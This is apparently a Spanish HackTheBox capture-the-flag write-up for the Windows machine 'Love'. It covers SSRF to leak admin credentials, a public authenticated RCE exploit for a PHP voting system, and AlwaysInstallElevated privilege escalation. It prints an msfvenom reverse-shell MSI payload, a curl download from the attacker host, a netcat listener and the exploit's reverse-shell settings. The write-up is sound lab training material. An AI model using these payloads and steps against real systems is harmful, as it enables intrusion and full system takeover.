# Love

![](../../../../~gitbook/image.md)Publicado: 16 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Love es una máquina Windows de dificultad fácil de HackTheBox que presenta un sistema de votación PHP vulnerable. La explotación inicial se basa en el Server-Side Request Forgery (SSRF) para acceder a servicios internos y obtener credenciales de administrador. Una vez autenticados, se explota una vulnerabilidad de ejecución remota de código (RCE) en el sistema de votación para ganar acceso inicial. La escalada de privilegios se logra abusando de la política de Windows "AlwaysInstallElevated" para ejecutar instaladores MSI con privilegios de SYSTEM.
### 🎯 Información de la Máquina
ParámetroValorIP10.10.10.239SOWindows 10 Pro 19042Servicios principalesHTTP (80), HTTPS (443), MySQL (3306), WinRM (5985/5986)Dominiosstaging.love.htb, love.htb
### 🔭 Reconocimiento

#### 🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### 🔍 Escaneo de puertos TCP

#### 🛠️ Enumeración de servicios

#### 🌐 Configuración de hosts
En el puerto 443 el nmap nos devuelve el nombre del dominio, el cual es `staging.love.htb`.
### 🌐 Enumeración Web

#### 🖥️ Puerto 80 HTTP (http://10.10.10.239/)
A priori no vemos gran cosa salvo un panel de login de lo que parece ser una aplicación para un sistema de votación:![](../../../../~gitbook/image.md)Vemos que para autenticarnos necesitamos un ID de votante y una contraseña.
#### 🔎 Fuzzing de directorios - Puerto 80
Usamos dirsearch para realizar fuzzing de directorios y ver si encontramos algunos recursos interesantes que analizar a nuestro scope:
####### 🔐 Puerto 443 HTTPS (staging.love.htb)
Al acceder al dominio `staging.love.htb` encontramos una aplicación web diferente.![](../../../../~gitbook/image.md)
#### 🔍 Fuzzing de directorios - Puerto 443

### 🚨 Explotación - SSRF (Server-Side Request Forgery)

#### 🔍 Descubrimiento de vulnerabilidad SSRF
Vemos algo interesante a la hora de acceder a la opción "Demo" y nos dirige al recurso `beta.php`. Nos pide introducir una URL con el sitio que queremos analizar para ver si tiene malware.![](../../../../~gitbook/image.md)
#### 🧪 Prueba de concepto SSRF
Primero verificamos si podemos alcanzar nuestro host de ataque iniciando un servidor web en Python y haciendo una petición.![](../../../../~gitbook/image.md)Luego probamos si podemos acceder a servicios internos referenciando la dirección IP de la propia máquina hacia el puerto 5000:URL probada: `http://127.0.0.1:5000`![](../../../../~gitbook/image.md)Al explotar la vulnerabilidad SSRF, encontramos unas credenciales que parecen ser para el panel de administrador:![](../../../../~gitbook/image.md)Credenciales obtenidas: `admin:@LoveIsInTheAir!!!!`
### 💥 Explotación - RCE en Voting System

#### 🔍 Identificación del software
El panel de administración pertenece a una aplicación llamada [Sourcecodester Voting System](https://www.sourcecodester.com).![](../../../../~gitbook/image.md)
#### 🕵️ Búsqueda de exploits
Buscamos exploits públicos para el software Voting System 1.0:
Parece que el panel pertenece a una aplicación llamada [sourcecodester](https://www.sourcecodester.com)![](../../../../~gitbook/image.md)Encontramos un exploit que permite RCE autenticada, perfecto para nuestras credenciales obtenidas.
#### ⚙️ Configuración del exploit
Deberemos editar los parámetros relacionados con la IP y el puerto del servicio donde se encuentra el aplicativo así como los relacionados con la IP y el puerto donde recibiremos la shell reversa.Tambien debemos adaptar los parámetros INDEX_PAGE, LOGIN_URL, VOTE_URL y CALL_SHELL para que la ruta corresponda con la del aplicativo, ya que por ejemplo el /votesystem/ no existe en la aplicación que estamos tratando de explotar:La configuración quedaría de esta forma:
#### 🎯 Ejecución del exploit
🚪 Acceso inicial obtenidoUna vez lanzado el exploit recibimos la reverse shell ganando acceso como usuario phoebe.![](../../../../~gitbook/image.md)Una vez dentro revisamos el directorio Desktop del usuario Phoebe para obtener la primera flag:
##### 🚀 Escalada de privilegios

#### 🔍 Enumeración de privilegios
Comenzamos a enumerar y realizar comprobaciones en busca de una vía potencial para la escalada de privilegios y encontramos que AlwaysInstallElevated está activo.
#### 📋 ¿Qué es AlwaysInstallElevated?
Cuando AlwaysInstallElevated está habilitada (`0x1`), permite que los archivos `.msi` (Microsoft Installer) se ejecuten con privilegios de administrador, incluso si el usuario no tiene derechos administrativos.🛠️ Generación del payload maliciosoPara abusar de esto y escalar privilegios podemos:- Generar un payload msi con el que ganar una reverse shell de altos privilegios
- Usar el script powerup para cargar el módulo y añadir un usuario nuevo al sistema.
En este caso que vamos a optar por generar un payload con msvenom de la siguiente forma:Lo transferimos al host Windows usando un servidor web en python y usando curl:Ahora iniciamos un listener donde recibiremos la reverse shell con privilegios NT system
#### 👑 Root Flag
Ejecutamos el binario y recibimos la reverse shell de altos privilegios![](../../../../~gitbook/image.md)Ya podemos obtener la flag root.txtLast updated 10 months ago- [📝 Descripción](#descripcion)
- [🎯 Información de la Máquina](#informacion-de-la-maquina)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [🚨 Explotación - SSRF (Server-Side Request Forgery)](#explotacion-ssrf-server-side-request-forgery)
- [💥 Explotación - RCE en Voting System](#explotacion-rce-en-voting-system)
- [## 🚀 Escalada de privilegios](#escalada-de-privilegios)

```
❯ ping -c2 10.10.10.239
PING 10.10.10.239 (10.10.10.239) 56(84) bytes of data.
64 bytes from 10.10.10.239: icmp_seq=1 ttl=127 time=45.5 ms
64 bytes from 10.10.10.239: icmp_seq=2 ttl=127 time=43.6 ms

--- 10.10.10.239 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1004ms
rtt min/avg/max/mdev = 43.631/44.570/45.510/0.939 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.239 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports

80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670
```

```
❯ nmap -sC -sV -p$ports 10.10.10.239 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 15:10 CEST
Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 94.74% done; ETC: 15:11 (0:00:05 remaining)
Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 94.74% done; ETC: 15:12 (0:00:08 remaining)
Nmap scan report for 10.10.10.239
Host is up (0.043s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_ssl-date: TLS randomness does not represent time
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2025-06-16T13:34:49+00:00; +21m34s from scanner time.
|_http-title: Not Found
| tls-alpn:
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-06-16T13:34:35
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-06-16T06:34:36-07:00
|_clock-skew: mean: 2h06m34s, deviation: 3h30m01s, median: 21m33s

```

```
echo "10.10.10.239 staging.love.htb" | sudo tee -a /etc/hosts
```

```
dirsearch -u http://10.10.10.239 -x 503,404,403

_|. _ _  _  _  _ _|_    v0.4.3
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25
Wordlist size: 12289

Target: http://10.10.10.239/

[15:17:23] Scanning:
[15:17:29] 301 -   337B - /ADMIN  ->  http://10.10.10.239/ADMIN/
[15:17:29] 301 -   337B - /Admin  ->  http://10.10.10.239/Admin/
[15:17:29] 301 -   337B - /admin  ->  http://10.10.10.239/admin/
[15:17:29] 200 -    6KB - /admin%20/
[15:17:30] 301 -   338B - /admin.  ->  http://10.10.10.239/admin./
[15:17:30] 200 -    6KB - /Admin/
[15:17:30] 200 -    6KB - /admin/
[15:17:30] 200 -    6KB - /admin/index.php
[15:17:31] 302 -   16KB - /admin/home.php  ->  index.php
[15:17:31] 302 -     0B - /admin/login.php  ->  index.php
[15:17:35] 301 -   348B - /bower_components  ->  http://10.10.10.239/bower_components/
[15:17:36] 200 -    7KB - /bower_components/
[15:17:36] 500 -   636B - /cgi-bin/printenv.pl
[15:17:38] 301 -   336B - /dist  ->  http://10.10.10.239/dist/
[15:17:38] 200 -    1KB - /dist/
[15:17:41] 302 -     0B - /home.php  ->  index.php
[15:17:42] 301 -   338B - /images  ->  http://10.10.10.239/images/
[15:17:42] 200 -    2KB - /images/
[15:17:42] 200 -    2KB - /includes/
[15:17:42] 301 -   340B - /includes  ->  http://10.10.10.239/includes/
[15:17:42] 200 -    4KB - /index.php
[15:17:42] 200 -    4KB - /index.pHp
[15:17:42] 200 -    4KB - /index.php.
[15:17:42] 200 -    4KB - /index.php/login/
[15:17:44] 302 -     0B - /login.php  ->  index.php
[15:17:44] 302 -     0B - /logout.php  ->  index.php
[15:17:48] 301 -   339B - /plugins  ->  http://10.10.10.239/plugins/
[15:17:48] 200 -    2KB - /plugins/
```

```
feroxbuster -u http://staging.love.htb/ -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 503 -x php,xml,asp,aspx

___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
🎯  Target Url            │ http://staging.love.htb/
🚀  Threads               │ 50
📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
💢  Status Code Filters   │ [503]
💥  Timeout (secs)        │ 7
🦡  User-Agent            │ feroxbuster/2.11.0
💉  Config File           │ /etc/feroxbuster/ferox-config.toml
🔎  Extract Links         │ true
📂  Scan Dir Listings     │ true
💲  Extensions            │ [php, xml, asp, aspx]
🏁  HTTP methods          │ [GET]
📍  Follow Redirects      │ true
🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       30w      306c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       33w      303c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      192l      404w     5357c http://staging.love.htb/index.php
200      GET       54l      182w     2370c http://staging.love.htb/font.css
200      GET      212l      392w     4997c http://staging.love.htb/beta.php
200      GET        1l     3527w   204030c http://staging.love.htb/style.css
200      GET      192l      404w     5357c http://staging.love.htb/
200      GET      192l      404w     5357c http://staging.love.htb/Index.php
403      GET       11l       47w      425c http://staging.love.htb/licenses
200      GET      192l      404w     5357c http://staging.love.htb/INDEX.php
200      GET      212l      392w     4997c http://staging.love.htb/Beta.php
```

```
searchsploit Voting System 1.0
```

```
searchsploit -m php/webapps/49846.txt
```

```
# --- Edit your settings here ----
IP = "10.10.10.239" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.14.7" # Reverse shell IP
REV_PORT = "443" # Reverse port
# --------------------------------

INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"
```

```
python3 49445.py
```

```
C:\Users\Phoebe\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is 56DE-BA30

Directory of C:\Users\Phoebe\Desktop

04/13/2021  03:20 AM              .
04/13/2021  03:20 AM              ..
06/16/2025  06:28 AM                34 user.txt
1 File(s)             34 bytes
2 Dir(s)   4,058,107,904 bytes free
```

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
AlwaysInstallElevated    REG_DWORD    0x1
```

```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.7 lport=443 -f msi > aie.msi
```

```
python3 -m http.server 80
```

```
PS C:\Temp\Privesc> curl http://10.10.14.7/aie.msi -o aie.msi
```

```
rlwrap nc -lnvp 443
```

```
PS C:\Temp\Privesc> ./aie.msi
```

```
C:\Users\Administrator\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is 56DE-BA30

Directory of C:\Users\Administrator\Desktop

04/13/2021  03:20 AM              .
04/13/2021  03:20 AM              ..
06/16/2025  06:28 AM                34 root.txt
1 File(s)             34 bytes
2 Dir(s)   4,047,945,728 bytes free
```
